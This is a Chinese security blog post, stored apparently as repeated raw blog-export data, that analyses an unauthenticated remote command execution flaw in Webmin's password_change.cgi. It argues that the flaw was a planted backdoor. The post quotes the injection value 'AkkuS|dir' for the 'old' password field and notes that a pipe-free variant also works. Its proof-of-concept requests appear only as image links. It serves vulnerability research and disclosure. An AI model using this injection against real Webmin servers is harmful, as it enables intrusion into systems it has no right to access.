SourceForge代码中存在漏洞，github代码中无漏洞\n\n[![29](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274482_29.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274482_29.png)\n\n通过以上三点，初步猜测，Webmin代码被移植入后门\n\n&nbsp;\n\n&nbsp;\n\n# **0x03 POC无需管道符**\n* * *\n\n目前业界流传的poc，都是需要使用管道符 “|”的形式：\n\n例如msf给出的poc：”AkkuS|dir ”\n\n[![30](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274792_30.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274792_30.png)\n\n但是经过漏洞深入的分析发现，old中的值最终会被直接执行，因此并不需要管道符\n\n可以构造如下poc\n\n[![31](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040827514_31.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040827514_31.png)\n\n[![32](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408280362_32.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408280362_32.png)","slug":"Webmin-RCE","published":1,"updated":"2020-10-27T09:25:29.863Z","_id":"ckgrozu8r001kwsa9dp27b1d0","comments":1,"layout":"post","photos":[],"link":"","content":"<p>近日Webmin被发现一处远程命令执行漏洞，经过分析后，初步猜测其为一次<strong>后门</strong>植入事件。</p>\n<p>Webmin是目前功能最强大的基于Web的Unix系统管理工具。管理员通过浏览器访问Webmin的各种管理功能并完成相应的管理动作。据统计，互联网上大约有13w台机器使用Webmin。当用户开启Webmin密码重置功能后，攻击者可以通过发送POST请求在目标系统中执行任意命令，且无需身份验证。</p>\n<a id=\"more\"></a>\n\n<h1 id=\"0x01-漏洞分析\"><a href=\"#0x01-漏洞分析\" class=\"headerlink\" title=\"0x01 漏洞分析\"></a><strong>0x01 漏洞分析</strong></h1><hr>\n<p>首先分析msf给出的插件</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408261534_0.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408261534_0.png\" alt=\"0\"></a></p>\n<p>&nbsp;</p>\n<p>根据插件，还原出poc如下：</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408261950_1.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408261950_1.png\" alt=\"1\"></a></p>\n<p>当poc执行后，回像password_change.cgi发送POST请求</p>\n<p>接下来看下password_change.cgi</p>\n<p>&nbsp;</p>\n<p>位于37行到188行处，存在if-else语句</p>\n<p>他们分别是</p>\n<p>1、if ($wuser)</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408262214_2.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408262214_2.png\" alt=\"2\"></a></p>\n<p>2、elsif ($gconfig{&#39;passwd_cmd&#39;})</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408262869_3.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408262869_3.png\" alt=\"3\"></a></p>\n<p>3、elsif ($in{&#39;pam&#39;})</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040826311_4.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040826311_4.png\" alt=\"4\"></a></p>\n<p>4、else</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408263475_5.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408263475_5.png\" alt=\"5\"></a></p>\n<p>&nbsp;</p>\n<p>我们需要确认，程序到底进入那个if分支了</p>\n<p>我们先print $wuser</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408263891_6.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408263891_6.png\" alt=\"6\"></a></p>\n<p>&nbsp;</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264127_7.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264127_7.png\" alt=\"7\"></a></p>\n<p>从上图打印结果看，wuser不为空，所以这里直接进入if ($wuser)分支</p>\n<p>在if ($wuser)分支中，首先执行encrypt_password方法，如下图红框处</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264453_8.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264453_8.png\" alt=\"8\"></a></p>\n<p>encrypt_password方法位于\\acl\\acl-lib.pl</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264754_9.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264754_9.png\" alt=\"9\"></a></p>\n<p>该方法的底层，调用了crypt方法，如下图，位于acl/md5-lib.pl中</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265039_10.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265039_10.png\" alt=\"10\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265391_11.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265391_11.png\" alt=\"11\"></a></p>\n<p>传入该crypt方法的第一个参数为$passwd</p>\n<p>&nbsp;</p>\n<p>打印此时passwd</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265599_12.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265599_12.png\" alt=\"12\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040826581_13.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040826581_13.png\" alt=\"13\"></a></p>\n<p>可见值为 AkkuS|dir，也就是POST请求中的old参数值</p>\n<p>&nbsp;</p>\n<p>encrypt_password底层调用crypt进行编码后，将计算值return,赋值给$enc,如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270184_14.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270184_14.png\" alt=\"14\"></a></p>\n<p>&nbsp;</p>\n<p>由于我们传入的pass(AkkuS|dir)并不是root用户的密码，下图红框处的eq结果为false</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270362_15.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270362_15.png\" alt=\"15\"></a></p>\n<p>&nbsp;</p>\n<p>因此触发pass_error，系统需要把Failed to change password : The current password is incorrect这个信息反馈给用户</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270668_16.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270668_16.png\" alt=\"16\"></a></p>\n<p>但是注意上图红框处，在pass_error方法的传参中，$in{’old’}被 qx/ /包裹</p>\n<p>了解下qx/ /在perl中的用法：</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270989_17.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270989_17.png\" alt=\"17\"></a></p>\n<p>qx执行外部程序，相当于``</p>\n<p>也就是说，$in{’old’}的值会被执行。$in{’old’}就是POST中传入的old参数，可控，所以这里造成了任意代码执行漏洞。</p>\n<p>&nbsp;</p>\n<p>值得注意的是，POST中的old参数，是用户修改密码时所提交的旧密码。众所周知，密码是一个字符串，而非可执行代码，这里将传入的旧密码字符串拿来执行，并非正常业务逻辑所为。</p>\n<p>&nbsp;</p>\n<p>不仅如此，$in{‘old’}的值在被执行后，会拼接在$text{‘password_eold’}参数后面，一同传入pass_error中，如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040827126_18.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040827126_18.png\" alt=\"18\"></a></p>\n<p>打印$text{‘password_eold’}，查看它的值</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408271552_19.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408271552_19.png\" alt=\"19\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408271888_20.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408271888_20.png\" alt=\"20\"></a></p>\n<p>当我们的$in{’old’}传入”AkkuS|dir”时，dir执行后的返回值会拼接到The current password is incorrect后，传入pass_error</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272062_21.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272062_21.png\" alt=\"21\"></a></p>\n<p>接着，在pass_error中被打印出来</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904082723100_22.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904082723100_22.png\" alt=\"22\"></a></p>\n<p>这里不仅仅将用户旧密码拿来执行，更是通过pass_error，把返回值直接打印到返回值中，更加落实了被植入后门的猜测</p>\n<p>&nbsp;</p>\n<p>对比官网\\ SourceForge\\github三个不同地方下载的Webmin代码发现，官网\\ SourceForge存在代码执行点，而github不存在</p>\n<p>1、官网与SourceForge：</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272692_23.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272692_23.png\" alt=\"23\"></a></p>\n<p>这里存在qx包裹的$in{‘old’}</p>\n<p>&nbsp;</p>\n<p>再来看github上下载的同版本Webmin代码</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272931_24.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272931_24.png\" alt=\"24\"></a></p>\n<p>Pass_error中竟然没有被qx包裹的$in{‘old’}</p>\n<p>&nbsp;</p>\n<p>对比如下：</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273256_25.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273256_25.png\" alt=\"25\"></a></p>\n<p>也就是说，github上下载的Webmin不存在代码执行漏洞，而官网和SourceForge上却存在</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<h1 id=\"0x02-被植入后门依据\"><a href=\"#0x02-被植入后门依据\" class=\"headerlink\" title=\"0x02 被植入后门依据\"></a><strong>0x02 被植入后门依据</strong></h1><hr>\n<p>1、 将用户提交的旧密码通过qx直接执行</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273550_26.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273550_26.png\" alt=\"26\"></a></p>\n<p>正常业务逻辑中旧密码为字符串，而非可执行代码，这里将密码字符串拿来直接执行，不符合逻辑</p>\n<p>&nbsp;</p>\n<p>2、 将执行结果通过报错打印到返回值中</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273736_27.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273736_27.png\" alt=\"27\"></a></p>\n<p>如果仅仅是执行代码，攻击者无法判断后台执行是否成功，以及无法得到执行成功后的返回值，例如”dir”、”ifconfig”这类指令，是需要看回显值得。因此，在这里通过pass_error将执行成功的返回值隐蔽的返回</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274065_28.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274065_28.png\" alt=\"28\"></a></p>\n<p>3、 官网\\ SourceForge代码中存在漏洞，github代码中无漏洞</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274482_29.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274482_29.png\" alt=\"29\"></a></p>\n<p>通过以上三点，初步猜测，Webmin代码被移植入后门</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<h1 id=\"0x03-POC无需管道符\"><a href=\"#0x03-POC无需管道符\" class=\"headerlink\" title=\"0x03 POC无需管道符\"></a><strong>0x03 POC无需管道符</strong></h1><hr>\n<p>目前业界流传的poc，都是需要使用管道符 “|”的形式：</p>\n<p>例如msf给出的poc：”AkkuS|dir ”</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274792_30.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274792_30.png\" alt=\"30\"></a></p>\n<p>但是经过漏洞深入的分析发现，old中的值最终会被直接执行，因此并不需要管道符</p>\n<p>可以构造如下poc</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040827514_31.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040827514_31.png\" alt=\"31\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408280362_32.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408280362_32.png\" alt=\"32\"></a></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2016-NSFOCUS-Security-Report-Regarding-Network-Video-Surveillance-Systems.jpg","excerpt":"<p>近日Webmin被发现一处远程命令执行漏洞，经过分析后，初步猜测其为一次<strong>后门</strong>植入事件。</p>\n<p>Webmin是目前功能最强大的基于Web的Unix系统管理工具。管理员通过浏览器访问Webmin的各种管理功能并完成相应的管理动作。据统计，互联网上大约有13w台机器使用Webmin。当用户开启Webmin密码重置功能后，攻击者可以通过发送POST请求在目标系统中执行任意命令，且无需身份验证。</p>","more":"<h1 id=\"0x01-漏洞分析\"><a href=\"#0x01-漏洞分析\" class=\"headerlink\" title=\"0x01 漏洞分析\"></a><strong>0x01 漏洞分析</strong></h1><hr>\n<p>首先分析msf给出的插件</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408261534_0.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408261534_0.png\" alt=\"0\"></a></p>\n<p>&nbsp;</p>\n<p>根据插件，还原出poc如下：</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408261950_1.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408261950_1.png\" alt=\"1\"></a></p>\n<p>当poc执行后，回像password_change.cgi发送POST请求</p>\n<p>接下来看下password_change.cgi</p>\n<p>&nbsp;</p>\n<p>位于37行到188行处，存在if-else语句</p>\n<p>他们分别是</p>\n<p>1、if ($wuser)</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408262214_2.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408262214_2.png\" alt=\"2\"></a></p>\n<p>2、elsif ($gconfig{&#39;passwd_cmd&#39;})</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408262869_3.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408262869_3.png\" alt=\"3\"></a></p>\n<p>3、elsif ($in{&#39;pam&#39;})</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040826311_4.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040826311_4.png\" alt=\"4\"></a></p>\n<p>4、else</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408263475_5.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408263475_5.png\" alt=\"5\"></a></p>\n<p>&nbsp;</p>\n<p>我们需要确认，程序到底进入那个if分支了</p>\n<p>我们先print $wuser</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408263891_6.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408263891_6.png\" alt=\"6\"></a></p>\n<p>&nbsp;</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264127_7.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264127_7.png\" alt=\"7\"></a></p>\n<p>从上图打印结果看，wuser不为空，所以这里直接进入if ($wuser)分支</p>\n<p>在if ($wuser)分支中，首先执行encrypt_password方法，如下图红框处</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264453_8.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264453_8.png\" alt=\"8\"></a></p>\n<p>encrypt_password方法位于\\acl\\acl-lib.pl</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264754_9.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408264754_9.png\" alt=\"9\"></a></p>\n<p>该方法的底层，调用了crypt方法，如下图，位于acl/md5-lib.pl中</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265039_10.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265039_10.png\" alt=\"10\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265391_11.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265391_11.png\" alt=\"11\"></a></p>\n<p>传入该crypt方法的第一个参数为$passwd</p>\n<p>&nbsp;</p>\n<p>打印此时passwd</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265599_12.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408265599_12.png\" alt=\"12\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040826581_13.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040826581_13.png\" alt=\"13\"></a></p>\n<p>可见值为 AkkuS|dir，也就是POST请求中的old参数值</p>\n<p>&nbsp;</p>\n<p>encrypt_password底层调用crypt进行编码后，将计算值return,赋值给$enc,如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270184_14.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270184_14.png\" alt=\"14\"></a></p>\n<p>&nbsp;</p>\n<p>由于我们传入的pass(AkkuS|dir)并不是root用户的密码，下图红框处的eq结果为false</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270362_15.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270362_15.png\" alt=\"15\"></a></p>\n<p>&nbsp;</p>\n<p>因此触发pass_error，系统需要把Failed to change password : The current password is incorrect这个信息反馈给用户</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270668_16.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270668_16.png\" alt=\"16\"></a></p>\n<p>但是注意上图红框处，在pass_error方法的传参中，$in{’old’}被 qx/ /包裹</p>\n<p>了解下qx/ /在perl中的用法：</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270989_17.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408270989_17.png\" alt=\"17\"></a></p>\n<p>qx执行外部程序，相当于``</p>\n<p>也就是说，$in{’old’}的值会被执行。$in{’old’}就是POST中传入的old参数，可控，所以这里造成了任意代码执行漏洞。</p>\n<p>&nbsp;</p>\n<p>值得注意的是，POST中的old参数，是用户修改密码时所提交的旧密码。众所周知，密码是一个字符串，而非可执行代码，这里将传入的旧密码字符串拿来执行，并非正常业务逻辑所为。</p>\n<p>&nbsp;</p>\n<p>不仅如此，$in{‘old’}的值在被执行后，会拼接在$text{‘password_eold’}参数后面，一同传入pass_error中，如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040827126_18.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040827126_18.png\" alt=\"18\"></a></p>\n<p>打印$text{‘password_eold’}，查看它的值</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408271552_19.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408271552_19.png\" alt=\"19\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408271888_20.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408271888_20.png\" alt=\"20\"></a></p>\n<p>当我们的$in{’old’}传入”AkkuS|dir”时，dir执行后的返回值会拼接到The current password is incorrect后，传入pass_error</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272062_21.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272062_21.png\" alt=\"21\"></a></p>\n<p>接着，在pass_error中被打印出来</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904082723100_22.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904082723100_22.png\" alt=\"22\"></a></p>\n<p>这里不仅仅将用户旧密码拿来执行，更是通过pass_error，把返回值直接打印到返回值中，更加落实了被植入后门的猜测</p>\n<p>&nbsp;</p>\n<p>对比官网\\ SourceForge\\github三个不同地方下载的Webmin代码发现，官网\\ SourceForge存在代码执行点，而github不存在</p>\n<p>1、官网与SourceForge：</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272692_23.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272692_23.png\" alt=\"23\"></a></p>\n<p>这里存在qx包裹的$in{‘old’}</p>\n<p>&nbsp;</p>\n<p>再来看github上下载的同版本Webmin代码</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272931_24.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408272931_24.png\" alt=\"24\"></a></p>\n<p>Pass_error中竟然没有被qx包裹的$in{‘old’}</p>\n<p>&nbsp;</p>\n<p>对比如下：</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273256_25.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273256_25.png\" alt=\"25\"></a></p>\n<p>也就是说，github上下载的Webmin不存在代码执行漏洞，而官网和SourceForge上却存在</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<h1 id=\"0x02-被植入后门依据\"><a href=\"#0x02-被植入后门依据\" class=\"headerlink\" title=\"0x02 被植入后门依据\"></a><strong>0x02 被植入后门依据</strong></h1><hr>\n<p>1、 将用户提交的旧密码通过qx直接执行</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273550_26.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273550_26.png\" alt=\"26\"></a></p>\n<p>正常业务逻辑中旧密码为字符串，而非可执行代码，这里将密码字符串拿来直接执行，不符合逻辑</p>\n<p>&nbsp;</p>\n<p>2、 将执行结果通过报错打印到返回值中</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273736_27.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408273736_27.png\" alt=\"27\"></a></p>\n<p>如果仅仅是执行代码，攻击者无法判断后台执行是否成功，以及无法得到执行成功后的返回值，例如”dir”、”ifconfig”这类指令，是需要看回显值得。因此，在这里通过pass_error将执行成功的返回值隐蔽的返回</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274065_28.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274065_28.png\" alt=\"28\"></a></p>\n<p>3、 官网\\ SourceForge代码中存在漏洞，github代码中无漏洞</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274482_29.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274482_29.png\" alt=\"29\"></a></p>\n<p>通过以上三点，初步猜测，Webmin代码被移植入后门</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<h1 id=\"0x03-POC无需管道符\"><a href=\"#0x03-POC无需管道符\" class=\"headerlink\" title=\"0x03 POC无需管道符\"></a><strong>0x03 POC无需管道符</strong></h1><hr>\n<p>目前业界流传的poc，都是需要使用管道符 “|”的形式：</p>\n<p>例如msf给出的poc：”AkkuS|dir ”</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274792_30.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408274792_30.png\" alt=\"30\"></a></p>\n<p>但是经过漏洞深入的分析发现，old中的值最终会被直接执行，因此并不需要管道符</p>\n<p>可以构造如下poc</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040827514_31.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040827514_31.png\" alt=\"31\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408280362_32.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408280362_32.png\" 